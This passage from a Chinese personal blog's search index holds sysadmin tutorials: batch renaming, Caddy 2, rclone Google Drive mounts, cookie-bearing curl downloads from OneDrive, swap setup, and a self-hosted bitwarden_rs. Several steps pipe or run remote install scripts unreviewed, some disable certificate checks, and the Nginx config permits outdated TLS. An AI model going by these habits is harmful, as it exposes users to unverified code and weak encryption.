\u0026#34;tokens=*\u0026#34; %%i in (\u0026#39;dir /a:d /b\u0026#39;) do ( set /A a+=1 ren \u0026#34;%%i\u0026#34; \u0026#34;电影!a!\u0026#34; ) 其中电影是每个文件夹所拥有的前缀\n后缀 # set a=1000 setlocal EnableDelayedExpansion for /f \u0026#34;tokens=*\u0026#34; %%i in (\u0026#39;dir /a:d /b\u0026#39;) do ( set /A a+=1 ren \u0026#34;%%i\u0026#34; \u0026#34;!a!电影\u0026#34; ) 其中电影是每个文件夹所拥有的后缀\n删去文件部分文件名 # 前缀 # setlocal enabledelayedexpansion for /f \u0026#34;delims=\u0026#34; %%i in (\u0026#39;dir /b [Sakurato.Sub] *\u0026#39;) do ( set var=%%i set var=!var:[Sakurato.Sub] =! ren \u0026#34;%%i\u0026#34; \u0026#34;!var!\u0026#34; ) pause 其中[Sakurato.Sub] 是每个文件所拥有的前缀\n中缀 # setlocal enabledelayedexpansion for /f \u0026#34;delims=\u0026#34; %%i in (\u0026#39;dir /b *Nekopara*\u0026#39;) do ( set var=%%i set var=!var:Nekopara=! ren \u0026#34;%%i\u0026#34; \u0026#34;!var!\u0026#34; ) pause 其中Nekopara是每个文件所拥有的中缀\n后缀 # setlocal enabledelayedexpansion for /f \u0026#34;delims=\u0026#34; %%i in (\u0026#39;dir /b * (HEVC-10Bit-2160P AAC)*\u0026#39;) do ( set var=%%i set var=!var: (HEVC-10Bit-2160P AAC)=! ren \u0026#34;%%i\u0026#34; \u0026#34;!var!\u0026#34; ) pause 其中 (HEVC-10Bit-2160P AAC)是每个文件所拥有的后缀\n替换部分文件名 # setlocal enabledelayedexpansion for /f \u0026#34;delims=\u0026#34; %%i in (\u0026#39;dir /b *Nekopara*\u0026#39;) do ( set var=%%i set var=!var:Nekopara=monika! ren \u0026#34;%%i\u0026#34; \u0026#34;!var!\u0026#34; ) pause 其中Nekopara是每个文件所拥有的一部分，这一部分将会被monika所替换\n自定义替换部分 # 请配合如何优雅的批量重命名文件【高玩】使用\nDIR *.* /B \u0026gt; list.csv =\u0026#34;ren \u0026#34;\u0026amp;A1\u0026amp;\u0026#34; \u0026#34;\u0026amp;B1\u0026amp;C1\u0026amp;\u0026#34;.docx\u0026#34; ","date":"2020年11月22日","externalUrl":null,"permalink":"/posts/batch-rename-file/","section":"","summary":"批量重命名挺麻烦的，所以我顺手整理了一下有哪些好方法可以批量重命名的","title":"如何优雅的批量重命名文件","type":"posts"},{"content":"","date":"2020年11月22日","externalUrl":null,"permalink":"/tags/%E5%B7%A5%E5%85%B7/","section":"Tags","summary":"","title":"工具","type":"tags"},{"content":"","date":"2020年11月22日","externalUrl":null,"permalink":"/tags/%E6%95%99%E7%A8%8B/","section":"Tags","summary":"","title":"教程","type":"tags"},{"content":" 下载安装 # 目前有三种安装途径，分别为官网(下面)、Github、各系统包管理。\n官网的最方便，因为下载后直接就是二进制单文件，不需要多余的操作步骤（而且还能附加插件），而 Github 的是压缩包还需要解压、包管理则还需要修改包管理源。\n# 创建文件夹并进入（自己可以改） mkdir /usr/local/caddy \u0026amp;\u0026amp; cd /usr/local/caddy # 下载 Caddy 文件，Caddy 2 不再支持 32 位系统了，如果要安装某些插件，还要进 https://caddyserver.com/download 去挑选一下 wget -N --no-check-certificate -O \u0026#34;caddy\u0026#34; \u0026#34;https://caddyserver.com/api/download?os=linux\u0026amp;arch=amd64\u0026#34; # 赋予执行权限 chmod +x caddy 配置示例 # Caddy 2 可以用命令行启动 HTTP 服务，也可以用配置文件（默认：Caddyfile，当然新版也实现了用 json 这种方式控制，对于设计自动化和程序化的服务更简单了，但是用 caddyfile 习惯了，纯写还是 caddyfile 简单有效）。\n不过命令行方式启动只适合于临时使用，毕竟默认是前台运行，所以还是用配置文件吧。 下列示例中，XXX.XX 为你的域名，如果要用 IP，请改成 :8080 ！\n静态文件服务： # # 下面的几行命令是一个整体，请修改后一起复制粘贴去运行 # /usr/local/caddy/Caddyfile 为默认配置文件位置，可以改 # /home/xxx 为网站目录路径，如果省略则为 caddy 程序所在文件夹 echo \u0026#34;XXX.XX { root * /home/xxx file_server }\u0026#34; \u0026gt;\u0026gt; /usr/local/caddy/Caddyfile 目录列表服务： # # 下面的几行命令是一个整体，请修改后一起复制粘贴去运行 # /usr/local/caddy/Caddyfile 为默认配置文件位置，可以改 # /home/xxx 为网站目录路径，如果省略则为 caddy 程序所在文件夹 echo \u0026#34;XXX.XX { root * /home/xxx file_server browse }\u0026#34; \u0026gt;\u0026gt; /usr/local/caddy/Caddyfile 反向代理服务： # # 下面的几行命令是一个整体，请修改后一起复制粘贴去运行 # /usr/local/caddy/Caddyfile 为默认配置文件位置，可以改 # YYY.YY 是目标网站，https:// 和 :8080 省略后分别默认为 https 协议和 443 端口 echo \u0026#34;XXX.XX { reverse_proxy https://YYY.YY:8080 }\u0026#34; \u0026gt;\u0026gt; /usr/local/caddy/Caddyfile 写好配置后，可以用这个命令检查下配置文件格式是否正确：\n/usr/local/caddy/caddy validate 启动停止 # Caddy 2 直接集成启动/停止等命令了，连系统服务脚本都不需要了！\n当然如果你想要守护进程，那么你还需要根据官网教程配置 systemd 系统服务。\n启动 # # start 命令是后台运行（可以关闭 SSH 终端），而 run 命令是前台运行。 # 启动成功会提示：Successfully started Caddy (pid=XXXX) - Caddy is running in the background /usr/local/caddy/caddy start --config /usr/local/caddy/Caddyfile --adapter caddyfile 停止 # # 停止成功会提示：stopping now, bye!! /usr/local/caddy/caddy stop 重载配置 # # 修改配置文件后不需要重启 Caddy ，重载一下就行了！ /usr/local/caddy/caddy reload 其他说明 # 如果嫌弃每次都要用 /usr/local/caddy/caddy执行命令，那可以做个软链接：\n# 软链接类似于 Windows 的快捷方式 ln -s /usr/local/caddy/caddy /usr/bin/caddy 这样你就可以把 /usr/local/caddy/caddy start 等命令简化为 caddy start 了！\n","date":"2020年11月10日","externalUrl":null,"permalink":"/posts/caddy2-install/","section":"","summary":"Caddy 2 是一个简单易用的 Web 服务器，支持 HTTP/2、自动 HTTPS、虚拟主机、反向代理、静态文件服务、目录列表等功能。","title":"Caddy 2 快速简单安装配置教程","type":"posts"},{"content":"","date":"2020年11月10日","externalUrl":null,"permalink":"/tags/%E5%BB%BA%E7%AB%99/","section":"Tags","summary":"","title":"建站","type":"tags"},{"content":" 说明 # 本教程只适用 Debian/Ubuntu 系统，如果你是 CentOS 或者其它 Linux 系统，请使用以下命令安装 rclone：\ncurl https://rclone.org/install.sh | sudo bash 初始化配置和挂载方法和下面一样，开机自启可参考该教程 → 传送门。\n安装 # 安装 rclone # wget https://gwliang.com/rclone_debian.sh \u0026amp;\u0026amp; bash rclone_debian.sh 初始化配置 # rclone config 会出现以下信息：\nn) New remote s) Set configuration password q) Quit config n/s/q\u0026gt; n name\u0026gt; gwl #配置名称，随便填 Type of storage to configure. Enter a string value. Press Enter for the default (\u0026#34;\u0026#34;). Choose a number from below, or type in your own value 1 / 1Fichier \\ \u0026#34;fichier\u0026#34; 2 / Alias for an existing remote \\ \u0026#34;alias\u0026#34; 3 / Amazon Drive \\ \u0026#34;amazon cloud drive\u0026#34; 4 / Amazon S3 Compliant Storage Provider (AWS, Alibaba, Ceph, Digital Ocean, Dreamhost, IBM COS, Minio, etc) \\ \u0026#34;s3\u0026#34; 5 / Backblaze B2 \\ \u0026#34;b2\u0026#34; 6 / Box \\ \u0026#34;box\u0026#34; 7 / Cache a remote \\ \u0026#34;cache\u0026#34; 8 / Dropbox \\ \u0026#34;dropbox\u0026#34; 9 / Encrypt/Decrypt a remote \\ \u0026#34;crypt\u0026#34; 10 / FTP Connection \\ \u0026#34;ftp\u0026#34; 11 / Google Cloud Storage (this is not Google Drive) \\ \u0026#34;google cloud storage\u0026#34; 12 / Google Drive \\ \u0026#34;drive\u0026#34; 13 / Google Photos \\ \u0026#34;google photos\u0026#34; 14 / Hubic \\ \u0026#34;hubic\u0026#34; 15 / JottaCloud \\ \u0026#34;jottacloud\u0026#34; 16 / Koofr \\ \u0026#34;koofr\u0026#34; 17 / Local Disk \\ \u0026#34;local\u0026#34; 18 / Mega \\ \u0026#34;mega\u0026#34; 19 / Microsoft Azure Blob Storage \\ \u0026#34;azureblob\u0026#34; 20 / Microsoft OneDrive \\ \u0026#34;onedrive\u0026#34; 21 / OpenDrive \\ \u0026#34;opendrive\u0026#34; 22 / Openstack Swift (Rackspace Cloud Files, Memset Memstore, OVH) \\ \u0026#34;swift\u0026#34; 23 / Pcloud \\ \u0026#34;pcloud\u0026#34; 24 / Put.io \\ \u0026#34;putio\u0026#34; 25 / QingCloud Object Storage \\ \u0026#34;qingstor\u0026#34; 26 / SSH/SFTP Connection \\ \u0026#34;sftp\u0026#34; 27 / Union merges the contents of several remotes \\ \u0026#34;union\u0026#34; 28 / Webdav \\ \u0026#34;webdav\u0026#34; 29 / Yandex Disk \\ \u0026#34;yandex\u0026#34; 30 / http Connection \\ \u0026#34;http\u0026#34; 31 / premiumize.me \\ \u0026#34;premiumizeme\u0026#34; Storage\u0026gt; 12 #选择12，Google Drive，注意该序列号会随时变化，看清楚再填 Google Application Client Id - leave blank normally. client_id\u0026gt; #留空 Google Application Client Secret - leave blank normally. client_secret\u0026gt; #留空 Service Account Credentials JSON file path - needed only if you want use SA instead of interactive login. service_account_file\u0026gt; #留空 Choose a number from below, or type in your own value 1 / Full access all files, excluding Application Data Folder. \\ \u0026#34;drive\u0026#34; 2 / Read-only access to file metadata and file contents. \\ \u0026#34;drive.readonly\u0026#34; / Access to files created by rclone only. 3 | These are visible in the drive website. | File authorization is revoked when the user deauthorizes the app. \\ \u0026#34;drive.file\u0026#34; / Allows read and write access to the Application Data folder. 4 | This is not visible in the drive website. \\ \u0026#34;drive.appfolder\u0026#34; / Allows read-only access to file metadata but 5 | does not allow any access to read or download file content. \\ \u0026#34;drive.metadata.readonly\u0026#34; scope\u0026gt; 1 ID of the root folder Leave blank normally. Fill in to access \u0026#34;Computers\u0026#34; folders. (see docs). Enter a string value. Press Enter for the default (\u0026#34;\u0026#34;). root_folder_id\u0026gt; Service Account Credentials JSON file path Leave blank normally. Needed only if you want use SA instead of interactive login. Enter a string value. Press Enter for the default (\u0026#34;\u0026#34;). service_account_file\u0026gt; Edit advanced config? (y/n) y) Yes n) No y/n\u0026gt; n #输入n Remote config Use auto config? * Say Y if not sure * Say N if you are working on a remote or headless machine y) Yes n) No y/n\u0026gt; n #输入n If your browser doesn\u0026#39;\u0026#39;t open automatically go to the following link: https://accounts.google.com/o/ #打开该地址获取code Log in and authorize rclone for access Enter verification code\u0026gt;hjdd #输入你获取到的code Configure this as a team drive? y) Yes n) No y/n\u0026gt; n #输入n -------------------- [gwl] type = drive client_id = 85042871 client_secret = D72gPc scope = drive token = {\u0026#34;access_token\u0026#34;:\u0026#34;y902Z\u0026#34;} -------------------- y) Yes this is OK e) Edit this remote d) Delete this remote y/e/d\u0026gt; y #输入y Current remotes: Name Type ==== ==== gwl drive e) Edit existing remote n) New remote d) Delete remote r) Rename remote c) Copy remote s) Set configuration password q) Quit config e/n/d/r/c/s/q\u0026gt; q #输入q保存退出 挂载为磁盘 # # 新建本地文件夹，路径自己定，即下面的LocalFolder mkdir /root/GoogleDrive # 挂载为磁盘，下面的DriveName、Folder、LocalFolder参数根据说明自行替换 rclone mount DriveName:Folder LocalFolder --copy-links --no-gzip-encoding --no-check-certificate --allow-other --allow-non-empty --umask 000 DriveName为初始化配置填的name，Folder为Google Drive里的文件夹，LocalFolder为 VPS 上的本地文件夹。\n挂载成功后，输入df -h命令查看即可！\n卸载磁盘 # fusermount -qzu LocalFolder 开机自启 # 先新建 systemd 配置文件，适用 CentOS 7、Debian 8+、Ubuntu 16+。\n再使用命令：\n#将后面修改成你上面手动运行命令中，除了rclone的全部参数 command=\u0026#34;mount DriveName:Folder LocalFolder --copy-links --no-gzip-encoding --no-check-certificate --allow-other --allow-non-empty --umask 000\u0026#34; #以下是一整条命令，一起复制到SSH客户端运行 cat \u0026gt; /etc/systemd/system/rclone.service \u0026lt;\u0026lt;EOF [Unit] Description=Rclone After=network-online.target [Service] Type=simple ExecStart=$(command -v rclone) ${command} Restart=on-abort User=root [Install] WantedBy=default.target EOF 开始启动：\nsystemctl start rclone 设置开机自启：\nsystemctl enable rclone 其他命令：\n重启：systemctl restart rclone 停止：systemctl stop rclone 状态：systemctl status rclone 如果你想挂载多个网盘，那么将 systemd 配置文件的 rclone.service 改成 rclone1.service 即可，重启动什么的同样换成 rclone1。\n","date":"2020年7月24日","externalUrl":null,"permalink":"/posts/mount-gd-for-rclone/","section":"","summary":"\u003ch1 class=\"relative group\"\u003e说明 \n    \u003cdiv id=\"%E8%AF%B4%E6%98%8E\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E8%AF%B4%E6%98%8E\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cp\u003e本教程只适用 Debian/Ubuntu 系统，如果你是 CentOS 或者其它 Linux 系统，请使用以下命令安装 rclone：\u003c/p\u003e","title":"在Debian/Ubuntu上使用rclone挂载Google Drive网盘","type":"posts"},{"content":"我所知的某个游戏分享站喜欢用 OneDrive 来分享游戏，用 OneDrive 很好，抵制百度网盘我强烈支持，但是 OneDrive 国内有时候抽风比较厉害，而在国外 OneDrive 下载几乎能跑满带宽，我 G 口的服务器可以跑到 110M/s，所以用国外服务器下载，然后再下载自己服务器里的东西会比较好。\n但是因为 OneDrive 有些坑，无法从分享界面获取真实下载链接，比如下面这个链接\nhttps://gitaccuacnz2-my.sharepoint.com/:f:/g/personal/mail_finderacg_com/EheQwACFhe9JuGUn4hlg9esBsKyk5jp9-Iz69kqzLLF5Xw?e=FG7SHh\n点开之后，找个文件点击下载，会得到这样的下载链接：\nhttps://gitaccuacnz2-my.sharepoint.com/personal/mail_finderacg_com/_layouts/15/download.aspx?UniqueId=cb44677f%2Dc4af%2D44ad%2D88d4%2Dceb07d9625da\n但是如果直接在服务器里 wget 这个下载链接，100%会 403: Forbidden\n有经验的老手都知道肯定是没带 Cookie ，但是要怎么带 Cookie 呢，其实很简单\n请使用 Chrome 或者是 Firefox，实测 Firefox 最快捷，不用进行更改，我下面就用 Firefox 进行演示。\n首先你需要按下 F12，打开开发人员工具，然后转到网络选项，之后点击想要下载的文件进行下载，同时观察开发人员工具窗口，找到带有 download.aspx/?\u0026hellip;. 的那个链接\n之后在那个链接上右键，选择 复制-复制为 cURL 命令(POSIX)\n会在剪切板出现类似下面的命令语句\ncurl \u0026#39;https://gitaccuacnz2-my.sharepoint.com/personal/mail_finderacg_com/_layouts/15/download.aspx?UniqueId=cb44677f%2Dc4af%2D44ad%2D88d4%2Dceb07d9625da\u0026#39; -H \u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0\u0026#39; -H \u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u0026#39; -H \u0026#39;Accept-Language: zh-HK,zh-TW;q=0.5\u0026#39; --compressed -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;Referer: https://gitaccuacnz2-my.sharepoint.com/personal/mail_finderacg_com/_layouts/15/onedrive.aspx?.......\u0026#39; -H \u0026#39;Cookie: CCSInfo=NS8yOS8yMDIwIDEwOjE1OjE0IEFNC/.....; FeatureOverrides_enableFeatures=; FeatureOverrides_disableFeatures=\u0026#39; -H \u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H \u0026#39;Sec-Fetch-Dest: iframe\u0026#39; -H \u0026#39;Sec-Fetch-Mode: navigate\u0026#39; -H \u0026#39;Sec-Fetch-Site: same-origin\u0026#39; 之后粘贴到 Linux 的命令行里，最后在后面补加一句 --output file.extension ,其中 file.extension 是想要保存的文件名。最终执行的命令就是类似这样的：\ncurl \u0026#39;https://gitaccuacnz2-my.sharepoint.com/personal/mail_finderacg_com/_layouts/15/download.aspx?UniqueId=cb44677f%2Dc4af%2D44ad%2D88d4%2Dceb07d9625da\u0026#39; -H \u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0\u0026#39; -H \u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u0026#39; -H \u0026#39;Accept-Language: zh-HK,zh-TW;q=0.5\u0026#39; --compressed -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;Referer: https://gitaccuacnz2-my.sharepoint.com/personal/mail_finderacg_com/_layouts/15/onedrive.aspx?.......\u0026#39; -H \u0026#39;Cookie: CCSInfo=NS8yOS8yMDIwIDEwOjE1OjE0IEFNC/.....; FeatureOverrides_enableFeatures=; FeatureOverrides_disableFeatures=\u0026#39; -H \u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H \u0026#39;Sec-Fetch-Dest: iframe\u0026#39; -H \u0026#39;Sec-Fetch-Mode: navigate\u0026#39; -H \u0026#39;Sec-Fetch-Site: same-origin\u0026#39; --output file.extension 最后就能享受高速下载了\n同时这个方法也适合文件夹下载，只不过前缀是 xxxxx-mediap.svc.ms ，其中xxxxx是地区代号，不同的下载链接所指向的地区不同，具体看情况，这里就不再赘述。\n如果使用 Chrome 下载，需要选择 复制 cURL(Bash) 然后把里面的换行和\\ 都处理掉，要不然会不行，但是我没成功过，按理讲应该是能成功的，算了，Firefox 能用就行了，又不是天天下载。\n","date":"2020年5月26日","externalUrl":null,"permalink":"/posts/linux-control-download-onedrive-files/","section":"","summary":"\u003cp\u003e我所知的某个游戏分享站喜欢用 OneDrive 来分享游戏，用 OneDrive 很好，抵制百度网盘我强烈支持，但是 OneDrive 国内有时候抽风比较厉害，而在国外 OneDrive 下载几乎能跑满带宽，我 G 口的服务器可以跑到 110M/s，所以用国外服务器下载，然后再下载自己服务器里的东西会比较好。\u003c/p\u003e","title":"Linux命令行下载OneDrive分享链接中的文件","type":"posts"},{"content":"","date":"2020年5月26日","externalUrl":null,"permalink":"/tags/%E4%B8%8B%E8%BD%BD/","section":"Tags","summary":"","title":"下载","type":"tags"},{"content":"我玩的服务器大多数内存比较小，有的时候执行一些任务会搞得 out of memory ，这个时候就需要设置虚拟内存，最好的方法就是用萌鼠大佬的一键脚本。\nwget https://www.moerats.com/usr/shell/swap.sh \u0026amp;\u0026amp; bash swap.sh\n但是有的时候执行完了会报错，这个时候就要麻烦一下，自己设置了\n新增 swap 区 # 创建一个 文件作为 swap 区： dd if=/dev/zero of=/swapfile1 bs=1024 count=2000000 名字为/swapfile1，大小为 bscount = 10242000000=2G，count 代表的是大小，我这里是 2G。\n将其转化为 swap 文件： mkswap /swapfile1 将其改为只有 root 权限才能修改（这个可以不弄） # chown root:root /swapfile1 # chmod 0600 /swapfile1 将其激活： swapon /swapfile1 如果想要系统重启后生效，可以打开/etc/fstab 在最后面加上一行： nano /etc/fstab /swapfile1 swap swap defaults 0 0 更改 swap 区大小 # 在网上没找到更多办法，有一个傻办法：\n1、通过上述的 1 ～ 5 步重建一个 swap 区，然后激活；\n2、先通过 swapoff 命令将之前的 swap 区失效，然后 rm 掉：\nswapoff /swapfile1 ","date":"2020年5月16日","externalUrl":null,"permalink":"/posts/set-swap/","section":"","summary":"\u003cp\u003e我玩的服务器大多数内存比较小，有的时候执行一些任务会搞得 out of memory ，这个时候就需要设置虚拟内存，最好的方法就是用萌鼠大佬的一键脚本。\u003c/p\u003e","title":"Debian系统安装Swap虚拟内存设置","type":"posts"},{"content":"","date":"2020年5月16日","externalUrl":null,"permalink":"/tags/swap/","section":"Tags","summary":"","title":"Swap","type":"tags"},{"content":"","date":"2020年5月16日","externalUrl":null,"permalink":"/tags/%E5%86%85%E5%AD%98/","section":"Tags","summary":"","title":"内存","type":"tags"},{"content":" [!WARNING] 此教程已过时，不再适用，仅供参考\n前言 # 原来的时候看过 Testv 介绍 1Password 的视频，可以全平台自动填充密码，自动生成无规律密码，看完之后很心动，毕竟密码安全也很重要，但是 1Password 太贵了，一年至少需要 35 美元。而且 1Password 还只能使用信用卡付款，像 Paypal 也不支持，这让很多想尝试 1Password 的朋友“望而却步”了。这篇文章主要分享一下在功能上和使用体验上媲美 1Password 的免费开源密码管理系统 Bitwarden，自建 Bitwarden，再也不用担心 1Password 删库“跑路”了。\nbitwarden_rs 安装教程 # 详细安装视频：https://www.bilibili.com/video/BV15t4y117UU\n网站：\n官网：https://bitwarden.com/ 第三方项目：https://github.com/dani-garcia/bitwarden_rs\nBitwarden 官方推荐使用 Docker 镜像安装，但是 Bitwarden 服务器使用 .Net 开发，如果使用 Docker 来部署，镜像体积过大；此外它使用 MSSQL 数据库，部署这个数据库对服务器配置要求比较高。\n而 bitwarden_rs 是第三方开发的 Bitwarden 安装镜像。bitwarden_rs 采用 Rust 实现了 Bitwarden 服务器，这个实现更进一步降低了对机器配置的要求，并且 Docker 镜像体积很小，部署非常方便。此外，官方服务器中需要付费订阅的一些功能，在这个实现中是免费的。测试在 512MB 内存上机子完美运行 bitwarden_rs。\n安装前准备 # 一台 VPS 主机。bitwarden_rs 使用 Docker 镜像来安装，需要使用一台 VPS 主机，配置不用太高，用 512MB 内存也能跑起来，而且非常地流畅。 一个域名。虽然有市面上有少的免费域名，但是建议还是使用付费的域名，密码这个东西比较重要，一旦确定要自建密码管理系统的话就要保证可以长期使用。 安装 Docker # 你需要先安装 Docker CE (社区版)和 Docker Compose，以下命令是基于 Debian 系统的演示，如果你是 CentOS、Ubuntu，请参考官网：\n安装 Docker CE (社区版)：https://docs.docker.com/install/linux/docker-ce/ubuntu/\n安装 Docker Compose：https://docs.docker.com/compose/install/#install-compose\n如果你已经安装过，就不需要看这一步了\nDebian 系统安装 Docker CE 和 Docker Compose 如下：\n#卸载() sudo apt-get remove docker docker-engine docker.io containerd runc #SET UP THE REPOSITORY sudo apt-get update sudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg2 \\ software-properties-common curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - #检测是否安装成功 sudo apt-key fingerprint 0EBFCD88 #有以下输出就表示成功添加Docker’s official GPG key: root@hostfbc9e58d73:~# sudo apt-key fingerprint 0EBFCD88 pub rsa4096 2017-02-22 [SCEA] 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 uid [ unknown] Docker Release (CE deb) \u0026lt;docker@docker.com\u0026gt; sub rsa4096 2017-02-22 [S] #添加stable repository sudo add-apt-repository \\ \u0026#34;deb [arch=amd64] https://download.docker.com/linux/debian \\ $(lsb_release -cs) \\ stable\u0026#34; #开始安装 sudo apt-get update sudo apt-get install docker-ce docker-ce-cli containerd.io #验证 Docker Engine - Community是否安装正确 sudo docker run hello-world #有以下输出就表示正确安装 root@hostfbc9e58d73:~# sudo docker run hello-world Unable to find image \u0026#39;hello-world:latest\u0026#39; locally latest: Pulling from library/hello-world 1b930d010525: Pull complete Digest: sha256:b8ba256769a0ac28dd126d584e0a2011cd2877f3f76e093a7ae560f2a5301c00 Status: Downloaded newer image for hello-world:latest Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \u0026#34;hello-world\u0026#34; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/ #安装 Docker Compose sudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose #检测是否安装成功 docker-compose --version #有输出即表示成功 docker-compose version 1.25.5, build 4667896b #如果提示命令不存在，可以手动创建链接 sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose 安装 Caddy V2 # bitwarden_rs 官方可以选择使用 Caddy 来搭建 Web 服务，主要原因是因为 Caddy 安装配置简单。\n安装方法点击 https://gwliang.com/2020/11/10/caddy2-install/\n当然你也可以选择使用 Nginx，下面也会给出 Nginx 的配置，如果你没有用过 HTTP Server，推荐使用 Caddy V2 来上手.\n安装 Caddy（已失效，仅作存档） # 安装方法点击 https://gwliang.com/2020/01/27/caddy-install\nbitwarden_rs 安装 # bitwarden_rs 安装只需要一句代码就可以搞定：\ndocker pull bitwardenrs/server:latest bitwarden_rs 配置方法 # 启动 bitwarden_rs # 启动 bitwarden 也很简单，我们只需要执行以下代码即可：\ndocker run -d --name bitwarden \\ -e SIGNUPS_ALLOWED=true \\ -e WEBSOCKET_ENABLED=true \\ -e LOG_FILE=/data/bitwarden.log \\ -p 8880:80 \\ -p 3012:3012 \\ -v /bw-data/:/data/ \\ bitwardenrs/server:latest 设置 Caddy V2 / Caddy / Nginx # Caddy V2 # 由于 V1 版本停止服务了，所以这里更新一下 Caddy V2 的代码，比 V1 还简单，在/usr/local/caddy/Caddyfile里输入下面的内容即可（要改下面的域名）\npwd.gwl.wtf { reverse_proxy 127.0.0.1:8880 reverse_proxy /notifications/hub 127.0.0.1:3012 reverse_proxy /notifications/hub/negotiate 127.0.0.1:8880 } Caddy（停止服务，代码仅作存档） # 如果你使用的是 Caddy，在/usr/local/caddy/Caddyfile里输入下面的内容即可（要改下面的域名）\npwd.gwl.wtf { gzip tls asdf@q.com proxy / 127.0.0.1:8880 { websocket header_upstream -Origin } proxy /notifications/hub 127.0.0.1:3012 { websocket header_upstream -Origin } proxy /notifications/hub/negotiate 127.0.0.1:8880 { websocket header_upstream -Origin } } Nginx # 如果你使用的是 Nginx，可以使用下面的配置（先要配置好了域名、SSL 等）\nserver { listen 80; listen 443 ssl http2; ssl_certificate /usr/local/nginx/conf/ssl/pwd.gwl.wtf.crt; ssl_certificate_key /usr/local/nginx/conf/ssl/pwd.gwl.wtf.key; ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ciphers TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-128-CCM-8-SHA256:TLS13-AES-128-CCM-SHA256:EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5; ssl_prefer_server_ciphers on; ssl_session_timeout 10m; ssl_session_cache builtin:1000 shared:SSL:10m; ssl_buffer_size 1400; add_header Strict-Transport-Security max-age=15768000; ssl_stapling on; ssl_stapling_verify on; server_name pwd.gwl.wtf; if ($ssl_protocol = \u0026#34;\u0026#34;) { return 301 https://$host$request_uri; } client_max_body_size 128M; location / { proxy_set_header Host \u0026#39;pwd.gwl.wtf\u0026#39;; proxy_pass http://127.0.0.1:8880; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location /notifications/hub { proxy_pass http://127.0.0.1:3012; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;upgrade\u0026#34;; } location /notifications/hub/negotiate { proxy_pass http://127.0.0.1:8880; } } 重启 Caddy/Nginx，刷新一下浏览器，你可以看到 bitwarden 已经可以正常访问了。\n禁止注册 # 为了保证 bitwarden 服务器的稳定，你可以禁止 bitwarden 注册新用户（这一项可以放在最后，否则你自己都无法注册了）。禁止新用户注册：\ndocker run -d --name bitwarden \\ -e SIGNUPS_ALLOWED=false \\ -v /bw-data/:/data/ \\ -p 80:80 \\ bitwardenrs/server:latest 关闭、重启、升级 # 关闭： docker stop bitwarden 启动： docker start bitwarden 需要升级的话，你只需要拉取最新的 image，rm 原来的 image，然后按之前的方法启动一个新的容器即可\n# Pull the latest version docker pull bitwardenrs/server:latest # Stop and remove the old container docker stop bitwarden docker rm bitwarden # Start new container with the data mounted docker run -d --name bitwarden \\ -e SIGNUPS_ALLOWED=true \\ -e WEBSOCKET_ENABLED=true \\ -e LOG_FILE=/data/bitwarden.log \\ -p 8880:80 \\ -p 3012:3012 \\ -v /bw-data/:/data/ \\ bitwardenrs/server:latest Docker Compose 配置 # 这一步可选。使用 Docker Compose 配置可以方便你管理 Docker，不用也可以。 在 bitwarden 目录创建 docker-compose.yml 文件\nnano docker-compose.yml 在 docker-compose.yml 写入一下配置，参考官方 wiki（https://github.com/dani-garcia/bitwarden_rs/wiki/Using-Docker-Compose）\nversion: \u0026#34;3\u0026#34; services: bitwarden: image: bitwardenrs/server container_name: bitwardenrs restart: always ports: - \u0026#34;127.0.0.1:8880:80\u0026#34; #将8880端口映射到镜像80端口 - \u0026#34;127.0.0.1:3012:3012\u0026#34; volumes: - ./bw-data:/data environment: WEBSOCKET_ENABLED: \u0026#34;true\u0026#34; #开启WebSocket SIGNUPS_ALLOWED: \u0026#34;true\u0026#34; #开启注册，自己注册后改成fale WEB_VAULT_ENABLED: \u0026#34;true\u0026#34; #web客户端\\ 运行服务 # docker-compose up -d #运行服务 docker-compose down #关闭服务 docker-compose restart #重启服务 bitwarden 管理密码 # 网页版 bitwarden # 网页版的 bitwarden 管理密码也是非常地方便。以下是 bitwarden 的界面，有中文：\n这是 bitwarden 的设置页面\n可以自己设置两步验证，加强安全性。\n浏览器 bitwarden # bitwarden 提供了 Chrome、Firefox 